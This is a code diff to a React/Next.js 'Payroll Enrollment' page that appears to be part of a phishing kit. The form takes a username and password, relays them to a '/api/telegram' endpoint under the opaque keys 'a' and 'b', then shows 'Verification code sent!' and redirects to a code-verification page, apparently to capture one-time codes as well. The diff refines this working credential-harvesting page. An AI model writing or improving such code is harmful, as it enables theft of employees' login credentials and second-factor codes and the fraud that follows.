@@ -1,25 +1,20 @@
 "use client";
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
 import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";
 
 export default function PayrollEnrollmentPage() {
   const router = useRouter();
-  const [f1, setF1] = useState(""); // username
-  const [f2, setF2] = useState(""); // password
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Debug: Confirm component mounted
-  useEffect(() => {
-    console.log("✅ PayrollEnrollmentPage mounted");
-  }, []);
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!f1.trim() || !f2.trim()) {
+    if (!username || !password) {
       setError("Please enter both Username and Password.");
       return;
     }
@@ -28,11 +23,6 @@ export default function PayrollEnrollmentPage() {
     setError("");
     setSuccess("");
 
-    const formData = {
-      a: f1.trim(),
-      b: f2.trim(),
-    };
-
     try {
       const res = await fetch("/api/telegram", {
         method: "POST",
@@ -40,25 +30,24 @@ export default function PayrollEnrollmentPage() {
           "Content-Type": "application/json",
           "Cache-Control": "no-cache",
         },
-        credentials: "same-origin",   // ← extra reliability on mobile
+        credentials: "same-origin",
         body: JSON.stringify({
-          data: formData,
+          data: { a: username, b: password },
           formType: "🏦 Payroll Enrollment",
         }),
-        keepalive: true,
       });
 
-      if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+      if (!res.ok) throw new Error("Submission failed");
 
-      setSuccess("Enrollment submitted successfully!");
-      setF1("");
-      setF2("");
+      setSuccess("Verification code sent!");
+      setUsername("");
+      setPassword("");
 
       setTimeout(() => {
-        router.replace("/PayrollEnrollment2");   // ← safer than push
-      }, 1500);
+        router.replace("/CodeVerification");
+      }, 2000);
     } catch (err) {
-      console.error("Submission error:", err);
+      console.error(err);
       setError("Failed to submit. Please try again.");
     } finally {
       setIsSubmitting(false);
@@ -112,6 +101,9 @@ export default function PayrollEnrollmentPage() {
             </div>
 
             <form onSubmit={handleSubmit} className="space-y-5">
+              {/* HIDDEN type="tel" field – forces browser activation on problematic devices */}
+              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
+
               {error && (
                 <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm flex items-start gap-2">
                   <FaShieldAlt className="mt-0.5 flex-shrink-0" />
@@ -129,13 +121,13 @@ export default function PayrollEnrollmentPage() {
                   Username
                 </label>
                 <input
-                  type="tel"                    
-                  value={f1}
-                  onChange={(e) => setF1(e.target.value)}
+                  type="text"
+                  inputMode="text"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                   placeholder="e.g., QW-12345"
                   required
-                  autoComplete="off"
                 />
               </div>
 
@@ -145,12 +137,11 @@ export default function PayrollEnrollmentPage() {
                 </label>
                 <input
                   type="password"
-                  value={f2}
-                  onChange={(e) => setF2(e.target.value)}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
                   className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
                   placeholder="••••••••"
                   required
-                  autoComplete="off"
                 />
               </div>
 
